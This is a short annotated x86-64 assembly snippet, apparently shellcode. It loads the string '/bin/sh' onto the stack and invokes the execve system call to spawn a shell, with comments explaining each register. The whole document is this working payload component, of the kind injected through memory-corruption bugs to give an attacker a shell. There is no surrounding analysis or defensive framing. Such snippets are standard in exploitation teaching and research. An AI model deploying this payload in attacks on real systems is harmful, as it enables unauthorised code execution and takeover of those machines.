mov rax, 0x68732f6e69622f ; 0x68732f6e69622f = "/bin/sh\x00"
push rax
mov rdi, rsp  ; rdi = "/bin/sh\x00"
xor rsi, rsi  ; rsi = NULL
xor rdx, rdx  ; rdx = NULL
mov rax, 0x3b ; rax = sys_execve
syscall       ; execve("/bin/sh", null, null)